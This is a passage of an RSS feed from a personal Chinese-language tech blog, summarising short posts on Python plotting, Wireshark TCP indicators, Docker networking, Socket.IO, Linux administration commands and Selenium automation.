<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>AC-LM &#39;s blog</title>
    <link>https://ac-lm.github.io/</link>
    <description>Recent content on AC-LM &#39;s blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Wed, 24 Nov 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://ac-lm.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Python(41)——matplotlib 的 backend</title>
      <link>https://ac-lm.github.io/posts/python/python43matplotlib-%E7%9A%84-backend/</link>
      <pubDate>Wed, 24 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python43matplotlib-%E7%9A%84-backend/</guid>
      <description>matplotlib的backend浅析 @王云峰 
 1.matplotlib 的 backend 浅析 在服务器使用matplotlib的时候，可能是因为没有装图形化和显示相关的包的原因，总是会出现backend相关的错误。
在 matplotlib 中，frontend 就是我们写的代码，而 backend 就是负责显示我们代码所写图形的底层代码。因为不同使用环境下硬件情况不同，所以后端是跟具体的硬件和显示条件相关的。
2.backend 的类别 backend 又分为两类，一类是 interface backend，又叫做 interactive backend，这一类是表示跟显示到屏幕相关的后端；另一类是 hardcopy backend，又叫做 non-interactive backend，这一类是写入到文件相关的后端。
non-interactive backend
interactive backend
import matplotlib matplotlib.rcsetup.interactive_bk # 获取 interactive backend matplotlib.rcsetup.non_interactive_bk # 获取 non-interactive backend matplotlib.rcsetup.all_backends # 获取 所有 backend 3.设置 backend 在代码中，有 4 种方式可以来设置 matplotlib 的 backend，而且下列中越后面的设置方式，优先级越高，后面的设置会覆盖前面的设置。
a.通过设置 matplotlibrc 的配置文件来设置 注意 matplotlibrc 文件不一定在你的工程目录下，可以通过如下命令来获取其存放位置:
import matplotlib matplotlib.get_configdir() u&amp;#39;/home/yunfeng/.config/matplotlib&amp;#39; 得到配置文件路径后，打开这个文件，写入如下一行来设置 backend:
backend : WXAgg # use wxpython with antigrain (agg) rendering 其中的 WXAgg 可以换成任意的你的系统支持的 backend 类型。 注意：backend 不区分大小写</description>
    </item>
    
    <item>
      <title>Net(11)——Wireshark 指标</title>
      <link>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/net11wireshark-%E6%8C%87%E6%A0%87/</link>
      <pubDate>Tue, 23 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/net11wireshark-%E6%8C%87%E6%A0%87/</guid>
      <description>1.WireShark 出现的常见提示 a.TCP Out_of_Order 一般来说是网络拥塞，导致顺序包抵达时间不同，延时太长，或者包丢失，需要重新组合数据单元，因为他们可能是由不同的路径到达你的电脑上面。
b.TCP Retransmission 超时引发的数据重传。
c.TCP dup ack XXX#X 重复应答 # 前的报文，表示报文到哪个序号丢失，# 后面的是表示第几次丢失。
d.tcp previous segment not captured 报文没有捕捉到，出现报文的丢失。
e.SYN 同步比特，建立连接。
f.ACK 确认比特，置1表示这是一个确认的TCP包，0则不是。
g.PSH 推送比特，当发送端PSH=1时，接收端应尽快交付给应用进程。</description>
    </item>
    
    <item>
      <title>Python(41)——matplotlib 绘图</title>
      <link>https://ac-lm.github.io/posts/python/python42matplotlib-%E7%BB%98%E5%9B%BE/</link>
      <pubDate>Tue, 23 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python42matplotlib-%E7%BB%98%E5%9B%BE/</guid>
      <description>Python绘图与可视化 @小杜同学的嘚啵嘚 
 1.使用 Matplotlib 进行绘图 所谓“一图胜千言”，我们很多时候需要通过可视化的方式查看、分析数据，我们可以导入 Matplotlib 包，并通过 Pyplot 对 Matplotlib 进行操作来绘图
安装：pip install matplotlib
import matplotlib.pyplot as plt # 约定俗成的写法 plt # 首先定义两个函数（正弦&amp;amp;余弦） import numpy as np X=np.linspace(-np.pi,np.pi,256,endpoint=True) # -π，to+π 的 256 个值 C,S=np.cos(X),np.sin(X) plt.plot(X,C) plt.plot(X,S) plt.show() 2.绘图命令的基本架构及其属性设置 上面的例子我们可以看出，几乎所有的属性和绘图的框架我们都选用默认设置。其作图时先要定义一个画布，此处的画布就是 Figure，然后再把其他素材“画”到该 Figure 上。
a.在 Figure 上创建子 plot，并设置属性 x=np.linspace(0,10,1000) # X轴数据 y1=np.sin(x) # Y轴数据 y2=np.cos(x**2) # Y轴数据 x^2即x的平方 plt.figure(figsize=(8,4)) plt.plot(x,y1,label=&amp;#34;$sin(x)$&amp;#34;,color=&amp;#34;red&amp;#34;,linewidth=2) # 将$包围的内容渲染为数学公式 plt.plot(x,y2,&amp;#34;b--&amp;#34;,label=&amp;#34;$cos(x^2)$&amp;#34;) # 指定曲线的颜色和线性，如‘b--’表示蓝色虚线（b：蓝色，-：虚线） plt.xlabel(&amp;#34;Time(s)&amp;#34;) plt.ylabel(&amp;#34;Volt&amp;#34;) plt.title(&amp;#34;PyPlot First Example&amp;#34;) &amp;#39;&amp;#39;&amp;#39; 使用关键字参数可以指定所绘制的曲线的各种属性： label：给曲线指定一个标签名称，此标签将在图标中显示。如果标签字符串的前后都有字符&amp;#39;$&amp;#39;，则Matplotlib会使用其内嵌的LaTex引擎将其显示为数学公式 color：指定曲线的颜色。颜色可以用如下方法表示 英文单词 以‘#’字符开头的3个16进制数，如‘#ff0000’表示红色。 以0~1的RGB表示，如（1.</description>
    </item>
    
    <item>
      <title>随记(38)——Socket.IO</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B038socket.io/</link>
      <pubDate>Tue, 23 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B038socket.io/</guid>
      <description>Introduction @Socket.IO 
 1.工作原理 Socket.IO 是 Websocket 的一个实现，其分为服务器（node.js）和客户端（浏览器、node.js或其他编程语言）。服务器与客户端之间的双向通道使用 Websocket 连接建立，并使用 HTTP 长轮询作为回退。
Socket.IO 代码库分为两个不同的层：
 低级管道：我们称之为 Engine.IO，作为 Socket.IO 的内部发动机 高级别 API： Socket.IO 本身  2.Engine.IO Engine.IO 负责建立服务器和客户端之间的低级连接。它处理：
 各种数据运输和升级机制 断开检测  a.运输 目前有两个已实现的运输：
 HTTP 长轮询 Websocket  b.握手 在 Engine.IO 连接的开始，服务器会发送一些信息：
{ &amp;#34;sid&amp;#34;: &amp;#34;FSDjX-WRwSA4zTZMALqx&amp;#34;, &amp;#34;upgrades&amp;#34;: [&amp;#34;websocket&amp;#34;], &amp;#34;pingInterval&amp;#34;: 25000, &amp;#34;pingTimeout&amp;#34;: 20000 }  sid 是会话的 ID，它必须包含在所有后续 HTTP 请求中的查询参数中 upgrades 包含由服务器支持的所有链接列表 pingInterval 与 pingTimeout 的值用于心跳机制，以检查连接状态  c.升级机制 默认情况下，客户端会先与 HTTP 长轮询传输建立连接。</description>
    </item>
    
    <item>
      <title>Docker(5)——Docker 网络</title>
      <link>https://ac-lm.github.io/posts/docker/docker5docker-%E7%BD%91%E7%BB%9C/</link>
      <pubDate>Mon, 22 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/docker/docker5docker-%E7%BD%91%E7%BB%9C/</guid>
      <description>1.基本原理 Docker 的本地网络实现依赖于 Linux 上的网络命名空间和虚拟网络设备。直观上看，要实现网络通信，机器需要至少一个网络接口（物理接口或虚拟接口）与外界相通，并可以收发数据包。此外，如果不同子网之间要进行通信，还需要额外的路由机制。
Docker 中的网络接口默认都是虚拟接口。虚拟接口的最大优势就是转发效率极高。这是因为 Linux 通过在内核中进行数据复制来实现虚拟接口之间的数据转发，即发送接口的发送缓存中的数据包将被直接复制到接收接口的接收缓存中，而无需通过外部物理网络设备进行交换。对于本地系统和容器内系统来看，虚拟接口跟一个正常的以太网卡相比并无区别，只是它速度要快得多。
Docker 在本地主机和容器内分别创建一个虚拟接口，并让它们彼此连通，这样的一对接口叫做 veth pair 。
一般情况下，Docker 在创建一个容器时，会具体执行如下操作：
 创建一对虚拟接口，分别放到本地主机和新容器的命名空间中 本地主机一端的虚拟接口连接到默认的 docker0 网桥或指定网桥上，并具有一个以 veth 开头的唯一名字，如veth1234 容器一端的虚拟接口将放到新创建的容器中，并修改名字作为 eth0，这个接口只在容器的命名空间可见 从网桥可用地址段中获取一个空闲地址分配给容器的 eth0（例如172.17.0.2/16），并配置默认路由网关为docker0 网卡的内部接口 docker0 的IP地址（例如172.17.42.1/16） 完成上述操作后，容器就可以使用 eth0 虚拟网卡来连接其他网络或外网  2.Docker 的网络模式 Docker 默认有三个网络模式，可以使用 docker network ls查看
 bridge：此模式会为每一个容器分配、设置IP等，并将容器连接到一个 docker0 虚拟网桥，通过 docker0 网桥以及 Iptables nat 表配置与宿主机通信，默认使用。 host：容器将不会虚拟出自己的网卡，配置自己的 IP 等，而是使用宿主机的 IP 和端口。 null：该模式关闭了容器的网络功能。  在使用 docker run 命令启动容器的时候，可以通过 --net 参数来指定容器的网络配置。
 --net=bridge：默认值，在 Docker 网桥 docker0 上为容器创建新的网络栈。 --net=none：让 Docker 将新容器放到隔离的网络栈中，但是不进行网络配置，之后，用户可以自行进行配置。 --net=container:NAME_or_ID：让 Docker 将新建容器的进程放到一个已存在容器的网络栈中，新容器进程有自己的文件系统、进程列表和资源限制，但会和已存在的容器共享 IP 地址和端口等网络资源，两者进程可以直接通过 lo 环回接口通信。 --net=host：告诉 Docker 不要将容器网络放到隔离的命名空间中，即不要容器化容器内的网络。此时容器使用本地主机的网络，它拥有完全的本地主机接口访问权限。容器进程可以跟主机其他 root 进程一样打开低范围的端口，可以访问本地网络服务，还可以让容器做一些影响整个主机系统的事情，比如重启主机。 --net=user_defined_network：用户自行用 network 相关命令创建一个网络，通过这种方式将容器连接到指定的已有网络上去。  3.</description>
    </item>
    
    <item>
      <title>Flutter(24)——常亮屏幕</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter24%E5%B8%B8%E4%BA%AE%E5%B1%8F%E5%B9%95/</link>
      <pubDate>Mon, 22 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter24%E5%B8%B8%E4%BA%AE%E5%B1%8F%E5%B9%95/</guid>
      <description> 使用 Wakelock 控制屏幕常亮 @简忆博客 
 1.Wakelock wakelock 是 android 的电源管理系统中一种锁的机制, 只要有 task 拿着这个锁, 系统就无法进入休眠, 可以被用户态进程和内核线程获得。
安装使用 a.添加到 pubspec.yaml dependencies: wakelock: ^0.1.4+1 b.在 Manifest 中添加如下权限 &amp;lt;uses-permission android:name=&amp;#34;android.permission.WAKE_LOCK&amp;#34; /&amp;gt; c.在页面引入和使用： import &amp;#39;package:wakelock/wakelock.dart&amp;#39;; // ... // The following line will enable the Android and iOS wakelock.Wakelock.enable(); // The next line disables the wakelock again.Wakelock.disable(); </description>
    </item>
    
    <item>
      <title>Linux(26)——Linux 网络配置</title>
      <link>https://ac-lm.github.io/posts/linux/linux26linux-%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Mon, 22 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux26linux-%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/</guid>
      <description>1.启动网卡 vim /etc/sysconfig/network-scripts/ifcfg-ens33 在文件夹/etc/sysconfig/network-scripts/中ifcfg-lo是回环网卡，ifcfg-ens33就是eth0。
编辑ifcfg-ens33，将ONBOOT改为yes，重新启动网卡，检查网络
service network restart ping 114.114.114.114 2.安装 net-tools，使用 ifconfig yum install net-tools ifconfig 3.启动 SSH service sshd start </description>
    </item>
    
    <item>
      <title>Python(41)——pyinstaller 打包</title>
      <link>https://ac-lm.github.io/posts/python/python41pyinstaller-%E6%89%93%E5%8C%85/</link>
      <pubDate>Mon, 22 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python41pyinstaller-%E6%89%93%E5%8C%85/</guid>
      <description> PyInstaller Manual @PyInstaller 4.6 documentation 
 pyinstaller pyinstaller 是 Python 的一个打包可执行文件的打包工具。其会根据平台不同进行打包，在 Windows 上打包 Windows 应用，在 Linux 上打包 Linux 的，不能交叉打包
# pyinstaller -F (单个可执行文件) 程序源 -n 程序名 -w(去掉控制台窗口，这在GUI界面时非常有用) -i 图标.ico” pyinstaller -F test1/Demo_Test1_Python.py </description>
    </item>
    
    <item>
      <title>Python(40)——获取当前文件路径</title>
      <link>https://ac-lm.github.io/posts/python/python40%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84/</link>
      <pubDate>Sun, 21 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python40%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84/</guid>
      <description>1.sys.path[0] 获取文件当前工作目录路径（绝对路径）
2.__file__ 获得文件所在的路径（由系统决定是否是全名）
3.os.path.abspath(__ file __) 获得文件所在的路径（绝对路径）
4.os.path.split(os.path.realpath(__ file __)) 将文件路径名称分成头和尾一对，生成二元元组（文件目录，文件名）</description>
    </item>
    
    <item>
      <title>Python(39)——Selenium executable_path 警告</title>
      <link>https://ac-lm.github.io/posts/python/python39selenium-executable_path-%E8%AD%A6%E5%91%8A/</link>
      <pubDate>Sat, 20 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python39selenium-executable_path-%E8%AD%A6%E5%91%8A/</guid>
      <description>1.Executable path has been deprecated please pass in a Service object in Selenium Python 使用 Selenium 时，程序正常运行，但出现 DeprecationWarning 警告的类型错误。这是由于版本更新时，所使用的方法过时的原因，表示该函数在当前版本被重构，还可以传入参数，但是在之后的某个版本会被删除.
查询当前版本重构后的函数，是之前的 executable_path 被重构到了 Service 函数里
from selenium import webdriver from selenium.webdriver.chrome.service import Service s = Service(r&amp;#34;D:\Software\webdrivers\chromedriver.exe&amp;#34;) driver = webdriver.Chrome(service=s) driver.get(&amp;#39;https://www.baidu.com&amp;#39;) driver.close() </description>
    </item>
    
    <item>
      <title>随记(37)——Websocket</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B037websocket/</link>
      <pubDate>Sat, 20 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B037websocket/</guid>
      <description>1.Websocket 简介 Websocket 被定义为服务器和客户端之间的双向通信，这意味着双方同时进行通信和交换数据。
Websocket 的关键点是真正的并发性和性能优化，从而产生响应更快，更丰富的 Web 应用程序。
Websocket 的 URL 为 ws://example.com:8000/chat.php</description>
    </item>
    
    <item>
      <title>Python(38)——MultipartEncoder 上传文件</title>
      <link>https://ac-lm.github.io/posts/python/python38multipartencoder-%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/</link>
      <pubDate>Fri, 19 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python38multipartencoder-%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/</guid>
      <description>上传文件模块 MultipartEncoder @山猪打不过家猪 
 1.上传文件模块 MultipartEncoder MultipartEncoder 是使用于上传文件的一个模块，其包含在模块 requests_toolbelt 中
pip install requests_toolbelt 官方提供了上传文件时 MultipartEncoder 的示例用法
from requests_toolbelt import MultipartEncoder encoder = MultipartEncoder({ &amp;#39;field&amp;#39;: (&amp;#39;file_name&amp;#39;, b&amp;#39;{&amp;#34;a&amp;#34;: &amp;#34;b&amp;#34;}&amp;#39;, &amp;#39;application/json&amp;#39;, {&amp;#39;X-My-Header&amp;#39;: &amp;#39;my-value&amp;#39;}) }) # field：服务端约定的上传文件字段名。一般用到的是file，需要和服务端沟通获取 # file_name: 文件名。一般可以任意写，服务端大多是拿到文件后自己再次命名 # b&amp;#39;{&amp;#34;a&amp;#34;:&amp;#34;b&amp;#34;}&amp;#39;：文件内容，以二进制代码存在。例：open(&amp;#39;/your/file/path&amp;#39;, &amp;#39;rb&amp;#39;) # &amp;#39;application/json&amp;#39;：文件的MimeType。不同文件类型需要对应不同的 MimeType # {&amp;#39;X-My-Header&amp;#39;: &amp;#39;my-value&amp;#39;}：其他内容，可不传。 payload = { &amp;#39;file&amp;#39;: (&amp;#39;upload.pdf&amp;#39;, open(&amp;#39;sync_test.pdf&amp;#39;, &amp;#39;rb&amp;#39;), &amp;#39;application/pdf&amp;#39;) } m = MultipartEncoder(payload) 参照官方给予的示例代码，我们可以仿照仿照出下列代码
import requests from requests_toolbelt import MultipartEncoder upload_url = &amp;#39;https://your/upload/url&amp;#39; payload = { &amp;#39;file&amp;#39;: (&amp;#39;upload.</description>
    </item>
    
    <item>
      <title>Linux(25)——在脚本中检查命令是否存在</title>
      <link>https://ac-lm.github.io/posts/linux/linux25%E5%9C%A8%E8%84%9A%E6%9C%AC%E4%B8%AD%E6%A3%80%E6%9F%A5%E5%91%BD%E4%BB%A4%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8/</link>
      <pubDate>Thu, 18 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux25%E5%9C%A8%E8%84%9A%E6%9C%AC%E4%B8%AD%E6%A3%80%E6%9F%A5%E5%91%BD%E4%BB%A4%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8/</guid>
      <description>check if a program exists from a Bash script? @Stack Overflow 
 1.Answer 你可以使用command -v来检查特定命令是否存在，在 Bash 脚本中使用以下代码检查
if ! command -v &amp;lt;the_command&amp;gt; &amp;amp;&amp;gt; /dev/null then echo &amp;quot;&amp;lt;the_command&amp;gt; could not be found&amp;quot; exit fi 在一些特别的环境中，还可以使用hash，type来进行检查
hash &amp;lt;the_command&amp;gt; # For regular commands. Or... type &amp;lt;the_command&amp;gt; # To check built-ins and keywords 2.Explanation 请避免使用which。在许多操作系统中which不会设置退出状态，其不会返回否。意味着如果if which foo不会返回foo不存在，总会报告foo存在。此外，which还会将输出更改或将结果挂载在包管理器中。
因此请尽量避免使用which，请改用以下方法。
$ command -v foo &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 || { echo &amp;gt;&amp;amp;2 &amp;quot;I require foo but it&#39;s not installed.</description>
    </item>
    
    <item>
      <title>Python(37)——#noqa</title>
      <link>https://ac-lm.github.io/posts/python/python37#noqa/</link>
      <pubDate>Thu, 18 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python37#noqa/</guid>
      <description>#noqas 将 #noqa 添加到一行表示 IDE 的 linter 代码质量检查程序不应该检查此行，该代码可能生成的任何警告都将被忽略。
import Nothing #noqa </description>
    </item>
    
    <item>
      <title>BUG(23)——Linux 报错 no C compiler found in $PATH</title>
      <link>https://ac-lm.github.io/posts/bug/bug23linux-%E6%8A%A5%E9%94%99-no-c-compiler-found-in-path/</link>
      <pubDate>Wed, 17 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/bug/bug23linux-%E6%8A%A5%E9%94%99-no-c-compiler-found-in-path/</guid>
      <description>BUG 描述 在 Linux 编译某些程序时，出现报错
configure: error: no acceptable C compiler found in $PATH
Resolution Linux 缺少合适的编译器
yum install gcc-c++ gcc 为 GNU Compiler Collection 的缩写，可以编译 C 和 C++ 源代码等，它是 GNU 开发的 C 和 C++ 以及其他很多种语言的编译器（最早的时候只能编译 C，后来很快进化成一个编译多种语言的集合，如 Fortran、Pascal、Objective-C、Java、Ada、 Go 等。）
gcc 在编译 C++ 源代码的阶段，只能编译 C++ 源文件，而不能自动和 C++ 程序使用的库链接（编译过程分为编译、链接两个阶段，源程序文件被编译成目标文件，多个目标文件连同库被链接成一个最终的可执行文件，可执行文件被加载到内存中运行）。因此，通常使用 g++ 命令来完成 C++ 程序的编译和连接，该程序会自动调用 gcc 实现编译。
g++ 也能编译 C 源代码，只不过把会把它当成 C++ 源代码。后缀为 .c 的源文件，gcc 把它当作是 C 程序，而 g++ 把它当作是 c++ 程序，后缀为 .cpp 的，两者都会认为是 c++ 程序。注意，虽然 c++ 是 c 的超集，但是两者对语法的要求是有区别的。</description>
    </item>
    
    <item>
      <title>Linux(24)——lscpu</title>
      <link>https://ac-lm.github.io/posts/linux/linux24lscpu/</link>
      <pubDate>Mon, 15 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux24lscpu/</guid>
      <description>lscpu 中 socket、core、thread 的意义 @Whosemario的家
 1.lscpu Linux 上使用 lscpu 可以查看CPU的信息
&amp;gt; lscpu 执行命令后会输出以下结果
Architecture: x86_64 CPU op-mode(s): 32-bit, 64-bit Byte Order: Little Endian CPU(s): 32 On-line CPU(s) list: 0-31 Thread(s) per core: 2 Core(s) per socket: 8 Socket(s): 2 NUMA node(s): 2 Vendor ID: GenuineIntel CPU family: 6 Model: 62 Model name: Intel(R) Xeon(R) CPU E5-2640 v2 @ 2.00GHz Stepping: 4 CPU MHz: 1320.468 CPU max MHz: 2500.0000 CPU min MHz: 1200.</description>
    </item>
    
    <item>
      <title>BUG(22)——Cypress 出现应用代码的错误</title>
      <link>https://ac-lm.github.io/posts/bug/bug22cypress-%E5%87%BA%E7%8E%B0%E5%BA%94%E7%94%A8%E4%BB%A3%E7%A0%81%E7%9A%84%E9%94%99%E8%AF%AF/</link>
      <pubDate>Sat, 18 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/bug/bug22cypress-%E5%87%BA%E7%8E%B0%E5%BA%94%E7%94%A8%E4%BB%A3%E7%A0%81%E7%9A%84%E9%94%99%E8%AF%AF/</guid>
      <description>BUG描述 在我们使用 Cypress 进行自动化时，有时网页自身的 JavaScript 会出现报错，此时 Cypress 也会捕抓这个异常，但这个异常并不是 Cypress 引起的，而我们也不需要这个异常。
Resolution 我们可以在脚本开头添加以下代码，屏蔽这类异常
Cypress.on(&amp;#39;uncaught:exception&amp;#39;, (err, runnable) =&amp;gt; { // returning false here prevents Cypress from  // failing the test  console.log(&amp;#39;Jerry errors!&amp;#39;); return false })  参考原文：https://www.cnblogs.com/sap-jerry/p/14713564.html
 </description>
    </item>
    
    <item>
      <title>Linux(23)——修改 Linux 时区或时间</title>
      <link>https://ac-lm.github.io/posts/linux/linux23%E4%BF%AE%E6%94%B9-linux-%E6%97%B6%E5%8C%BA%E6%88%96%E6%97%B6%E9%97%B4/</link>
      <pubDate>Sat, 18 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux23%E4%BF%AE%E6%94%B9-linux-%E6%97%B6%E5%8C%BA%E6%88%96%E6%97%B6%E9%97%B4/</guid>
      <description>1.查看和修改Linux的时区  date -R：查看当前时区 tzselect：适用于 RedHat Linux 和 CentOS 的时区设置 timeconfig：适用于 Debian 的时区设置 cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime：复制时区文件，以替换系统时区文件，来设置时间  2.查看和修改Linux的时间  date：查看时间和日期 date -s 11/03/2009：将系统日期设定成2009年11月3日 date -s 17:55:55：将系统时间设定成下午5点55分55秒 hwclock -w：将当前时间和日期写入BIOS，避免重启后失效  </description>
    </item>
    
    <item>
      <title>Python(36)——文件写入读取</title>
      <link>https://ac-lm.github.io/posts/python/python36%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E8%AF%BB%E5%8F%96/</link>
      <pubDate>Sat, 18 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python36%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E8%AF%BB%E5%8F%96/</guid>
      <description>1.只读模式打开文件 打开一个文件用 open() 方法，open()会返回一个可迭代的文件对象：
&amp;gt;&amp;gt;&amp;gt; f = open(&#39;test.txt&#39;, &#39;r&#39;) r 表示是文本文件，rb 是二进制文件，函数默认值就是 r
如果文件不存在，open()函数就会抛出一个 IOError 的错误，并且给出错误码和详细的信息告诉你文件不存在：
&amp;gt;&amp;gt;&amp;gt; f=open(&#39;test.txt&#39;, &#39;r&#39;) Traceback (most recent call last): File &amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt; FileNotFoundError: [Errno 2] No such file or directory: &#39;test.txt&#39; 文件使用完毕后必须关闭，因为文件对象会占用操作系统的资源，并且操作系统同一时间能打开的文件数量也是有限的
&amp;gt;&amp;gt;&amp;gt; f.close() 由于文件读写时都有可能产生IOError，一旦出错，后面的f.close()就不会调用。所以，为了保证无论是否出错都能正确地关闭文件，Python 引入了with语句来自动帮我们调用close()方法：
with open(&#39;/path/to/file&#39;, &#39;r&#39;) as f: print(f.read()) 2.读取文件 python 文件对象提供了三个读方法： read()、readline()、readlines()，每种方法可以接受一个变量以限制每次读取的数据量。
 read()会读取整个文件，并将文件内容放到一个字符串变量中。注意，如果文件大于可用内存，则程序可能会报错，因此，为了保险起见，可以通过调用read(size)方法，指定每次最多读取 size 个字节的内容。 readlines() 会读取整个文件，像read()一样，但是readlines()会自动将文件内容分析成一个行的列表，该列表可以进行迭代。 readline()每次只读取一行，并将结果放入一个字符串变量中。  PS：上述三种方法都会把每行末尾的\n也一并读取。
3.写入模式打开文件 写文件和读文件是一样的，唯一区别是调用open()函数时，需要传入标识符&#39;w&#39;或者&#39;wb&#39;表示写文本文件或写二进制文件：
&amp;gt;&amp;gt;&amp;gt; f = open(&#39;test.txt&#39;, &#39;w&#39;) # 若是&#39;wb&#39;就表示写二进制文件 &amp;gt;&amp;gt;&amp;gt; f.</description>
    </item>
    
    <item>
      <title>BUG(21)——Linux 缺少 OpenSSL</title>
      <link>https://ac-lm.github.io/posts/bug/bug21linux-%E7%BC%BA%E5%B0%91-openssl/</link>
      <pubDate>Fri, 17 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/bug/bug21linux-%E7%BC%BA%E5%B0%91-openssl/</guid>
      <description>BUG描述 在 Linux 编译某些软件时，会出现报错
fatal error: openssl/ssl.h: No such file or directory centos
Resolution 这是缺少 OpenSSL 导致的，重新安装即可
要在 Debian、Ubuntu 或者其他衍生版上安装 OpenSSL：
sudo apt-get install libssl-dev 要在 Fedora，CentOS 或者 RHEL 上安装 OpenSSL：
sudo yum install openssl-devel 安装完后，尝试重新编译程序</description>
    </item>
    
    <item>
      <title>Linux(22)——Top 命令详解</title>
      <link>https://ac-lm.github.io/posts/linux/linux22top-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/</link>
      <pubDate>Fri, 17 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux22top-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/</guid>
      <description>1.top 命令的用法 top 命令常用于监控 linux 的系统状况，是常用的性能分析工具，能够实时显示系统中各个进程的资源占用情况，其使用格式如下：
top [-d number] # -d：top命令显示的页面更新一次的间隔,单位秒。 top [-bnp] # -b：以批次的方式执行top。 -n：与-b配合使用，表示需要进行几次top命令的输出结果。 -p：指定特定的pid进程观察。 在 top 命令运行时，用户还可以输入以下按键执行相应的功能（注意区分大小写）：
 ?：显示在top当中可以输入的命令 P：以CPU的使用资源排序显示 M：以内存的使用资源排序显示 N：以 pid 排序显示 T：由进程使用的时间累计排序显示 k：给某一个 pid 一个信号，杀死进程 r：给某个pid重新定制一个 nice 值（即优先级） q：退出top（或 Ctrl+C）  2.top各输出的含义 第1行 top - 05:43:27 up 4:52, 2 users, load average: 0.58, 0.41, 0.30
   内容 含义     05:43:27 系统当前时间   up 4:52 系统运行时间，格式为时：分   2 users 当前登录用户数   load average: 0.</description>
    </item>
    
    <item>
      <title>Python(35)——使用 selenium 自动化 Electron</title>
      <link>https://ac-lm.github.io/posts/python/python35%E4%BD%BF%E7%94%A8-selenium-%E8%87%AA%E5%8A%A8%E5%8C%96-electron/</link>
      <pubDate>Fri, 17 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python35%E4%BD%BF%E7%94%A8-selenium-%E8%87%AA%E5%8A%A8%E5%8C%96-electron/</guid>
      <description>1.原理 Electron 是一个基于 Node.js 和 Chromium 的开源框架，由于 Chromium 是谷歌浏览器的内核，因此我们可以把 Electron 看做是一个特别的浏览器。既然是浏览器，那显然可以使用 webdriver 对其进行控制，在 Python 中通过 selenium 实现对 Electron 的自动化测试。
2.实现 from selenium import webdriver options = webdriver.ChromeOptions() options.binary_location = &amp;#34;/Applications/Electron.app/Contents/MacOS/Electron&amp;#34; driver = webdriver.Chrome(options=options, executable_path=&amp;#39;chromedriver.exe&amp;#39;) # t = driver.find_elements_by_css_selector(&amp;#34;.el-input__inner&amp;#34;) # t[0].send_keys(&amp;#39;123456&amp;#39;) # t[1].send_keys(&amp;#39;123456&amp;#39;) # sleep(3) # driver.find_element_by_css_selector(&amp;#34;.submit-item button&amp;#34;).click() driver.quit() </description>
    </item>
    
    <item>
      <title>Web开发(15)——ES6-ES12的开发技巧</title>
      <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%9115es6-es12-%E7%9A%84%E5%BC%80%E5%8F%91%E6%8A%80%E5%B7%A7/</link>
